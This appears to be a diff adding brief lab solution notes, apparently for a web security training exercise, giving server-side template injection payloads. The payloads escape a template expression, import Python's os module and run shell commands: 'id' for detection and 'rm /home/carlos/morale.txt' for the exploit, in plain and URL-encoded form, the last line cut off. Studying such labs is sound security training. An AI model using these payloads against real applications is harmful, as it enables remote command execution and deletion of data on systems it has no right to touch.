@@ -1,0 +1,6 @@
+1. To detect:
+ -> user.name}}{% import os %}{{os.system('id')
+
+2. Exploit:
+ -> Plain-text: user.name}}{% import os %}{{os.popen('rm /home/carlos/morale.txt').read()}}
+ -> Url-encoded: user.name%7d%7d%7b%25+import+os+%25%7d%7b%7b+os.popen('rm+/home/carlos/morale.txt').read()+%
